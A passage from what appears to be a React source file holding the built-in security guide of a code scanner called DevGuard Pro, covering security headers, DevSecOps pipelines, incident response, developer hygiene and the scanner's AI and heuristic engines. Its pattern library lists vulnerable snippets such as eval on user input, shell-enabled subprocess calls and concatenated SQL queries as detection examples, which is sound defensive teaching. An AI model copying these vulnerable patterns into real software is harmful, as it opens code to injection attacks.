\`\`\`

## Clickjacking Prevention

\`\`\`
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
\`\`\`

## Secure Cookie Settings

\`\`\`
Set-Cookie: session=abc123; 
  HttpOnly;              /* JS cannot read it */
  Secure;               /* HTTPS only */
  SameSite=Strict;      /* No cross-site requests */
  Path=/;
  Max-Age=3600          /* 1 hour */
\`\`\`
`
      },
      {
        subtitle: '5.5 DevSecOps — Security in Your Pipeline',
        content: `Security must be automated into every stage of the development lifecycle.

## Pre-Commit Hooks with Husky

\`\`\`bash
npm install --save-dev husky
npx husky init
\`\`\`

**.husky/pre-commit:**
\`\`\`bash
#!/bin/sh
npm run lint
npx gitleaks detect --staged   # Detect secrets in staged files
npm audit --audit-level=high   # Block commits with high/critical CVEs
\`\`\`

## Secret Scanning Tools

\`\`\`bash
# TruffleHog — deep repo historical scan
trufflehog github --repo=https://github.com/yourorg/yourrepo

# Gitleaks — CI/CD friendly
gitleaks detect --staged       # Pre-commit
gitleaks detect                # Full repo scan
\`\`\`

**GitHub Actions integration:**
\`\`\`yaml
- name: Scan for secrets
  uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
\`\`\`

## Dependency Scanning in CI

\`\`\`yaml
- name: Security audit
  run: |
    npm audit --audit-level=high
    # Fails build if high or critical vulnerabilities found
\`\`\`

## Container Image Scanning

\`\`\`yaml
- name: Scan container image
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'myapp:latest'
    exit-code: '1'
    severity: 'CRITICAL,HIGH'
\`\`\`

## Secure Dockerfile

\`\`\`dockerfile
# Use specific version tags, not :latest (prevents uncontrolled updates)
FROM node:20.12.2-alpine3.19

# Run as non-root user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

# Install only production dependencies
RUN npm ci --only=production && npm cache clean --force

# Health check
HEALTHCHECK --interval=30s --timeout=3s CMD node healthcheck.js
\`\`\`

## Penetration Testing Schedule

| Frequency | Activity |
|-----------|----------|
| Every deployment | Automated DAST (OWASP ZAP) against staging |
| Quarterly | External penetration test |
| Annually | Red team exercise (for high-value targets) |
| Ongoing | Bug bounty program (HackerOne, Bugcrowd) |
`
      },
      {
        subtitle: '5.6 Incident Response — When You Get Breached',
        content: `Security incidents happen to everyone. Organizations that handle them well are those that **prepared before** they happened.

## The Six Phases of Incident Response

### Phase 1 — Preparation (Before Any Incident)

- Document all systems: architecture diagrams, data flows, secret locations
- Define roles: Who is the Incident Commander? Who communicates to users?
- Establish secure communication channels (separate from potentially compromised systems)
- Run tabletop exercises quarterly: *"A database with user PII was just exposed. Go."*

### Phase 2 — Identification

How you'll know you've been breached:
- SIEM/monitoring alert triggered
- Unusual billing spikes (crypto mining via your cloud account)
- User complaints about suspicious account activity
- Security researcher disclosure
- Law enforcement notification

### Phase 3 — Containment (Within Minutes)

\`\`\`bash
# Immediate actions — preserve evidence first
# DO NOT wipe or shut down servers before forensic preservation

# 1. Isolate affected systems (remove from network, keep running)
# 2. Rotate ALL potentially exposed credentials immediately
# 3. Block attacker IPs at the firewall
# 4. Enable maximum-verbosity logging
\`\`\`

### Phase 4 — Eradication

- Identify the root cause (how did they get in?)
- Remove attacker persistence mechanisms (backdoors, new accounts, cron jobs, modified files)
- Patch the exploited vulnerability
- Scan all systems for indicators of compromise (IoCs)

### Phase 5 — Recovery

- Restore from **known-good backups**
- Harden the exploited vector before bringing systems back online
- Monitor intensely for 72 hours after restoration
- Gradually restore service, start with least-critical systems

### Phase 6 — Lessons Learned (Within 2 Weeks)

- Post-mortem without blame
- Root cause analysis
- What worked? What failed?
- Specific, accountable action items with owners and deadlines
- Share findings with the team (and publicly when appropriate — transparency builds trust)

## Regulatory Notification Requirements

| Regulation | Notification Deadline |
|------------|----------------------|
| GDPR | 72 hours to supervisory authority |
| HIPAA | 60 days to HHS + affected individuals |
| PCI DSS | Immediately to card brands and acquirer |
| CCPA | "In the most expedient time possible" |

> Consult a qualified attorney before sending any breach notifications.`
      },
      {
        subtitle: '5.7 Personal Security Hygiene for Developers',
        content: `Your personal security is the perimeter around your employer's security.

## Password Management

**The rule:** A password manager storing a different 20+ character random password for every site.

**Recommended managers:**
- **Bitwarden** — Open source, self-hostable, excellent free tier
- **1Password** — Best teams/business features
- **KeePassXC** — Fully offline, no cloud sync

**Your master password:** Use the diceware method — 5+ random words:
\`correct-horse-battery-staple-x92\`

## MFA Hierarchy (Best to Worst)

| Method | Security | Notes |
|--------|----------|-------|
| Hardware key (YubiKey) | ⭐⭐⭐⭐⭐ | Phishing-proof — verifies actual domain |
| Authenticator app (TOTP) | ⭐⭐⭐⭐ | Strong, widely supported |
| Passkeys | ⭐⭐⭐⭐ | New standard, growing support |
| Push notifications | ⭐⭐⭐ | Vulnerable to push fatigue attacks |
| SMS OTP | ⭐⭐ | Vulnerable to SIM swapping |
| Email OTP | ⭐ | Circular dependency with email compromise |

**Enable hardware keys for:** cloud console, GitHub, email, password manager.

## Workstation Security Checklist

- [ ] Full-disk encryption (FileVault/BitLocker/LUKS)
- [ ] Auto-lock after 2–5 minutes of inactivity
- [ ] Software firewall enabled
- [ ] DNS over HTTPS (Cloudflare 1.1.1.1 or NextDNS)
- [ ] SSH: Disable password auth, use Ed25519 keys only
- [ ] Audit installed applications quarterly — remove unused software

## Phishing Defense

**Red flags to recognize:**
- Urgent language ("Your account will be deleted in 24 hours")
- Requests for credentials, 2FA codes, or private keys
- Slightly wrong domain names (\`githubb.com\`, \`arnazon.com\`)
- Unexpected package updates bypassing normal review

**Hardware keys eliminate phishing entirely** — they cryptographically verify the actual domain name, so fake login pages can never steal the credential.`
      }
    ]
  },
  {
    id: 'ch-ai-engine',
    title: 'AI Remediation Engine',
    icon: <Zap size={16} />,
    description: "Deep dive into DevGuard Pro's Gemini-powered analysis layer, prompt engineering, and output validation.",
    sections: [
      {
        subtitle: '6.1 How the AI Analysis Works',
        content: `DevGuard Pro's AI Remediation Engine is built on **Google Gemini 2.5 Flash**, optimized for code analysis tasks.

## The Analysis Prompt Structure

\`\`\`javascript
// System instruction (simplified)
const systemPrompt = \`You are an elite DevSecOps code remediation engine.
Analyze the provided code vulnerabilities and return ONLY valid JSON:
{
  "analysis": "2-3 sentence explanation of vulnerabilities and fixes",
  "fixedCode": "complete fixed source code"
}\`;

// User message
const userPrompt = \`
ORIGINAL CODE: [user's code snippet]
VULNERABILITIES DETECTED:
- Line 3: HARDCODED_SECRET (critical) — API key exposed in source code
- Line 4: XSS_VECTOR (high) — document.write with unvalidated input
Return ONLY the JSON.
\`;
\`\`\`

## Output Validation Pipeline

Every API response is validated before display:

1. **JSON parsing** — If it fails, the response is shown as raw text with a warning
2. **Schema validation** — Both \`analysis\` and \`fixedCode\` fields must be present
3. **XSS safety** — \`fixedCode\` is rendered in a sandboxed code block, never as HTML

## Rate Limits & Quotas

| Tier | Requests Per Minute | Cost Per Analysis |
|------|--------------------|--------------------|
| Free (AI Studio) | 2–15 RPM | $0 |
| Pay-as-you-go | 1,000+ RPM | ~$0.05–$0.20 per analysis |

DevGuard Pro shows a user-friendly countdown timer when the rate limit is hit.`
      },
      {
        subtitle: '6.2 Heuristic Engine Pattern Library',
        content: `The heuristic engine operates **without any AI costs**, making it suitable for unlimited scanning.

## Pattern Categories

### Secrets Detection
Detects credentials hardcoded in source files:

\`\`\`javascript
// All of these are flagged
const API_KEY = "AKIAIOSFODNN7EXAMPLE";      // AWS key format
const token = "ghp_16abcXyZ...";             // GitHub personal access token
const password = "MySecretPassword1";        // Generic password variable
const key = "sk_live_abc123...";             // Stripe live key
const connection = "mongodb://user:pass@host"; // Connection string with creds
\`\`\`

### Dangerous Function Calls
\`\`\`javascript
// JavaScript/TypeScript
eval(userInput)                              // Code injection
new Function(userInput)()                    // Same as eval
setTimeout("code string", 1000)              // String-form setTimeout
document.write(variable)                     // DOM XSS vector
dangerouslySetInnerHTML={{ __html: input }}  // React XSS
\`\`\`

\`\`\`python
# Python
exec(user_input)                             # Code injection
eval(user_expression)                        # Expression injection
subprocess.call(cmd, shell=True)             # Command injection
os.system(user_cmd)                          # Command injection
\`\`\`

### SQL Injection Patterns
\`\`\`javascript
// Any string concatenation adjacent to SQL keywords
db.query("SELECT " + req.body.field + " FROM users")
db.query(\`SELECT * FROM orders WHERE id = \${req.params.id}\`)
"SELECT * FROM users WHERE email = '" + email + "'"
\`\`\`

### Cryptographic Weaknesses
\`\`\`javascript
// Weak algorithms
crypto.createHash('md5')                     // MD5 — cryptographically broken
crypto.createHash('sha1')                    // SHA1 — deprecated for security
Math.random()                                // Not cryptographically secure

// Correct alternatives
crypto.randomBytes(32)                       // Cryptographically secure random
crypto.createHash('sha256')                  // Acceptable for non-password use
\`\`\`

## Severity Classification

| Severity | Description | Action Required |
|----------|-------------|----------------|
| **Critical** | Immediate business risk, likely exploitable | Fix before any commit |
| **High** | Serious vulnerability with clear exploit path | Fix within current sprint |
| **Medium** | Security weakness requiring specific conditions | Fix within 2–4 weeks |
| **Low** | Best practice violation, low exploit likelihood | Fix in next maintenance window |`
      }
    ]
  },
  {
    id: 'ch-monitoring',
    title: 'Security Monitoring & History',
    icon: <Activity size={16} />,
    description: 'Understanding your security posture through scan history, metrics, and trend analysis.',
    sections: [
      {
        subtitle: '7.1 The Security Posture Dashboard',
        content: `DevGuard Pro's Dashboard provides three critical metrics at a glance:

## Metrics Explained

### Total Scans Executed
The number of unique code snippets you've analyzed. A growing number indicates an active, security-conscious development practice.

### Total Issues Detected
Cumulative count of vulnerabilities found across all scans. Track the **issues-per-scan ratio** over time — a declining ratio indicates improved coding practices.

### Critical Violations
Count of critical-severity findings. **This should trend toward zero.** Critical violations represent immediate business risk and should never reach production code.

---

## Bookmarks — Your Executive Brief

Bookmarked scans are promoted to the Dashboard summary table. Use bookmarks for:

- Scans that represent milestone states (before/after a security refactor)
- Scans that found particularly severe vulnerabilities worth remembering
- Scans of production-like code that serve as security baselines
- Scans you want to share with team leads or security officers`
      },
      {
        subtitle: '7.2 Using Scan History Effectively',
        content: `The History page is your security journal. Here's how to get the most from it.

## Code Restoration (Time Travel)

The **Restore** button in each history item loads the exact code snippet back into the Scanner. Use this to:

- Compare old vs new implementations of the same function
- Reproduce a vulnerability from a previous sprint for a post-mortem
- Demonstrate improvement to stakeholders (before/after comparison)

## Tracking Improvement Over Time

Sort your history chronologically and observe the issue count trend:

| Week | Code Module | Issues Found |
|------|------------|-------------|
| Week 1 | User auth module | 12 issues |
| Week 2 | After initial refactor | 8 issues |
| Week 3 | After security review | 3 issues |
| Week 4 | Production ready | 0 issues ✅ |

This narrative is powerful for **performance reviews**, client security reports, and developer portfolio documentation.

## Post-Mortem Use Case

Expand any history item to see the full vulnerability report as captured. Invaluable for:

- *"When did this SQL injection first appear in our codebase?"*
- *"Show me all scans from the Q1 2026 audit period"*
- *"Here's a real XSS vulnerability from our own code — let's learn from it"*`
      }
    ]
  },
  {
    id: 'ch-advanced',
    title: 'Advanced Security Topics',
    icon: <Cpu size={16} />,
    description: 'Zero Trust Architecture, browser security internals, HTTP security headers, and cloud security.',
    sections: [
      {
        subtitle: '8.1 Zero Trust Architecture',
        content: `Traditional security assumed a "castle and moat" model: everything inside the firewall is trusted. **Zero Trust inverts this: trust nothing, verify everything, always.**

## The Five Pillars of Zero Trust

### 1. Verify Explicitly
Authenticate and authorize **every request** based on all available data points:
- User identity (MFA-verified)
- Device health (MDM status, patch level, certificate)
- Network location (corporate network vs. random VPN exit)
- Application being accessed (service-to-service uses mTLS + service accounts)
- Data sensitivity classification

### 2. Use Least Privilege Access
**Never grant standing access.** Use Just-In-Time (JIT) privileged access:
- Developer needs prod DB read access? Approved, **granted for 2 hours**, automatically revoked
- No one has permanent admin access — they request it when needed

### 3. Assume Breach
Design for the scenario where your perimeter controls have **already failed**:
- End-to-end encryption for all data in transit (even within your private network)
- Micro-segmentation: even if an attacker is "inside," they can't reach other segments
- Continuous behavioral monitoring: detect anomalies even from authenticated users

### 4. Verify Device Health
A valid user credential from a compromised device is **not** a valid login. Requires:
- Mobile Device Management (MDM): Jamf, Intune, Kandji
- Endpoint Detection and Response (EDR): CrowdStrike, SentinelOne
- Certificate-based device authentication

### 5. Explicit Network Microsegmentation

\`\`\`yaml
# Kubernetes NetworkPolicy example
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: db-access
spec:
  podSelector:
    matchLabels:
      role: database
  ingress:
  - from:
    - podSelector:
        matchLabels:
          role: app-server  # ONLY app-server pods can reach database
    ports:
    - protocol: TCP
      port: 5432
\`\`\`

> **Zero Trust does NOT mean "no trust"** — it means trust is **dynamic** (reassessed continuously), **contextual** (same user gets different access in different contexts), and **minimal** (only what's needed for the current task).`
      },
      {
        subtitle: '8.2 HTTP Security Headers — Complete Reference',
        content: `Security headers are the fastest security wins available — usually a one-line config change with significant impact.

## Content Security Policy (CSP)

The most powerful security header. Prevents XSS, data injection, and clickjacking.

\`\`\`
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{randomPerRequest}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  object-src 'none';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
\`\`\`

## Strict-Transport-Security (HSTS)

Forces browsers to always use HTTPS for your domain:

\`\`\`
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
\`\`\`

Submit to **HSTS Preload List** at [hstspreload.org](https://hstspreload.org) — your domain is built into browsers' HTTPS-only list before the first request.

## Permissions Policy

Restrict browser feature access:

\`\`\`
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()
\`\`\`

Prevents any JavaScript (including XSS payloads) from accessing these APIs.

## Full Header Implementation (Express.js)

\`\`\`javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: { /* ... */ },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  crossOriginEmbedderPolicy: false, // Set true if using SharedArrayBuffer
}));

// Additional headers helmet doesn't set
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  next();
});
\`\`\`

## Security Headers Grading

Verify your headers at [securityheaders.com](https://securityheaders.com).

| Grade | Meaning |
|-------|---------|
| A+ | All headers correctly set |
| A | Most headers set |
| B | Some headers missing |
| C-F | Significant headers missing — not production ready |

**Target: A+ before any production launch.**`
      }
    ]
  }
];
